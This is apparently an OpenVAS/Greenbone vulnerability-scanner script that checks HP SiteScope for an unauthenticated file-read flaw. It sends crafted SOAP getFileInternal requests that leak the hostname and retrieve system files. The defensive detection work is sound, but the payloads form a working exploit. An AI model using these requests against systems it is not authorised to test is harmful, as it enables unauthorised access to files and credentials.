# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:hp:sitescope";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106881");
  script_version("2023-07-14T16:09:27+0000");
  script_tag(name:"last_modification", value:"2023-07-14 16:09:27 +0000 (Fri, 14 Jul 2023)");
  script_tag(name:"creation_date", value:"2017-06-19 10:42:13 +0700 (Mon, 19 Jun 2017)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"Mitigation");

  script_name("HP SiteScope Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_hp_sitescope_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("hp/sitescope/installed");

  script_tag(name:"summary", value:"HP SiteScope is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"HP SiteScope is prone to multiple vulnerabilities:

  - Missing Authentication for Critical Function

  - Use of Hard-coded Cryptographic Key

  - Use of a Broken or Risky Cryptographic Algorithm

  - Insufficiently Protected Credentials");

  script_tag(name:"impact", value:"An unauthenticated, remote attacker may be able to access arbitrary files
  from the system running SiteScope, or obtain credentials to SiteScope.");

  script_tag(name:"solution", value:"Check the referenced advisories for mitigation steps.");

  script_xref(name:"URL", value:"https://www.kb.cert.org/vuls/id/768399");
  script_xref(name:"URL", value:"http://bytesdarkly.com/disclosures/2017/06/exploiting-hp-sitescope-from-zero-to-compromise.html");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

soap = string("<?xml version='1.0' encoding='UTF-8'?>\r\n",
              "<wsns0:Envelope\r\n",
              "xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'\r\n",
              "xmlns:xsd='http://www.w3.org/2001/XMLSchema'\r\n",
              "xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'\r\n",
              ">\r\n",
              "<wsns0:Body\r\n",
              "wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'\r\n",
              ">\r\n",
              "<impl:getFileInternal\r\n",
              "xmlns:impl='http://Api.freshtech.COM'\r\n",
              ">\r\n",
              "<in0\r\n",
              "xsi:nil='true'\r\n",
              "xsi:type='xsd:string'\r\n",
              "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\r\n",
              "></in0>\r\n",
              "<in1\r\n",
              "xsi:nil='true'\r\n",
              "xsi:type='xsd:string'\r\n",
              "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\r\n",
              "></in1>\r\n",
              "</impl:getFileInternal>\r\n",
              "</wsns0:Body>\r\n",
              "</wsns0:Envelope>");

url = dir + '/services/APISiteScopeImpl';

req = http_post_put_req(port: port, url: url, data: soap,
                    add_headers: make_array("SoapAction", '""', "Content-Type", "text/xml; charset=UTF-8"));

res = http_keepalive_send_recv(port: port, data: req);

hostname = eregmatch(pattern: '<ns3:hostname xmlns:ns3="http://xml.apache.org/axis/">([^<]+)',
                     string: res);
if (isnull(hostname[1]))
  exit(0);
else
  hostname = hostname[1];

files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];

  soap = string("<?xml version='1.0' encoding='UTF-8'?>\r\n",
                "<wsns0:Envelope\r\n",
                "xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'\r\n",
                "xmlns:xsd='http://www.w3.org/2001/XMLSchema'\r\n",
                "xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'\r\n",
                ">\r\n",
                "<wsns0:Body\r\n",
                "wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'\r\n",
                ">\r\n",
                "<impl:getFileInternal\r\n",
                "xmlns:impl='http://Api.freshtech.COM'\r\n",
                ">\r\n",
                "<in0\r\n",
                "xsi:type='xsd:string'\r\n",
                "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\r\n",
                ">", hostname, "</in0>\r\n",
                "<in1\r\n",
                "xsi:type='xsd:string'\r\n",
                 "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\r\n",
                ">", file, "</in1>\r\n",
                "</impl:getFileInternal>\r\n",
                "</wsns0:Body>\r\n",
                "</wsns0:Envelope>");

  req = http_post_put_req(port: port, url: url, data: soap,
                      add_headers: make_array("SoapAction", '""', "Content-Type", "text/xml; charset=UTF-8"));
  res = http_keepalive_send_recv(port: port, data: req);

  if ("boundary=" >< res && '<getFileInternalReturn href="cid:' >< res) {
    report = "It was possible to retrieve the file " + file;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
